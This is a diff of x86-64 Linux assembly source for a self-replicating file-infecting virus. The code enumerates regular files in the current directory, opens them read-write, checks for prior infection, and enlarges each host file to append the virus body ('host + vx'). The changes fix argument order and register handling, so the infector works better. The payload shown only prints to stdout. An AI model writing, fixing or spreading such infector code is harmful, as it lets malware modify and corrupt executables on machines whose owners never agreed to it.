@@ -24,7 +24,7 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   ;; ENUM FILES >-----------------------------------------------------------<
 
   push  "."
-  Open  rsp,  0x00, O_RDONLY  ; rax = Open(".", 0, 0)
+  Open  rsp,  O_RDONLY, 0x00  ; rax = Open(".", 0, 0)
 
   test  rax,  rax             ; if (rax < 0)
   jl    VExitRoutine          ;   exit()
@@ -42,9 +42,6 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   mov   [rsp + SZ_DENT],  rax ; EndCount  = rax
   
   .EnumFiles:
-    xor   rax,  rax
-    mov   al, byte [rsp + r9 + linux_dirent64.d_type]
-    lea   rax,  [rsp + r9 + linux_dirent64.d_name]
     cmp   byte [rsp + r9 + linux_dirent64.d_type], DT_REG
     jne   .NextIteration
 
@@ -52,7 +49,7 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
     
     lea   r13, [rsp + r9 + linux_dirent64.d_name]
 
-    Open  r13,  0x00,   O_RDWR
+    Open  r13,  O_RDWR, 0x00
     test  rax,  rax
     jl   .NextIteration
   
@@ -75,7 +72,10 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
     je    .NextFile               ; Already Infected
     
     ;; INFECT FILE >--------------------------------------------------------<
+
+    push  rbx
     call  Infect
+    pop   rbx
     jmp   .EnumDirDone
 
   .NextFile:
@@ -87,38 +87,38 @@ _start: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
     jne   .EnumFiles
 
 .EnumDirDone:
-  Close rbx
-  add   rsp, SZ_DENT
-  pop   rdi
-  Close [rsp]
-  jmp   VExitRoutine
+  Close   rbx
+  add     rsp,  SZ_DENT
+  pop     rdi
+  Close   [rsp]
+  jmp     VExitRoutine
 
 Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
-  push  rbp
-  mov   rbp,  rsp
-  sub   rsp,  0x90 
+  push    rbp
+  mov     rbp,  rsp
+  sub     rsp,  0x90 
 
   ;; STAT + MMAP >----------------------------------------------------------<
   
-  FStat rdi,  rsp
-  test  rax,  rax
-  jne   .InfectExit
+  FStat   rdi,  rsp
+  test    rax,  rax
+  jne     .InfectExit
   
   ; extend filesize (ftruncate)
-  xor   rbx,  rbx
-  mov   rbx,  VExitRoutine
-  mov   rax,  _start
-  sub   rbx,  rax
+  xor     rbx,  rbx
+  mov     rbx,  VExitRoutine
+  mov     rax,  _start
+  sub     rbx,  rax
 
-  mov   r10,  [rsp + stat.st_size]  ; save copy :)
+  mov     r10,  [rsp + stat.st_size]  ; save copy :)
 
-  add   rbx,  [rsp + stat.st_size]  ; host + vx
-  add   rsp,  0x90                  ; free my boi stack, he aint do nun' wrong
+  add     rbx,  [rsp + stat.st_size]  ; host + vx
+  add     rsp,  0x90                  ; free my boi stack, he aint do nun' wrong
 
-  xor   rsi,  rsi
-  FTruncate   rdi,  rbx
-  test  rax,  rax
-  jne   .InfectExit
+  xor     rsi,  rsi
+  FTruncate     rdi,  rbx
+  test    rax,  rax
+  jne     .InfectExit
 
   ; Mmap(...)
 
@@ -133,9 +133,9 @@ Infect: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
   ;; EXEC PAYLOAD (PRINT STDOUT) >------------------------------------------<
 
   .InfectExit:
-  xor   rax,  rax
-  mov   rsp,  rbp
-  pop   rbp
+  xor     rax,  rax
+  mov     rsp,  rbp
+  pop     rbp
   ret
 
 VExitRoutine: ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@;
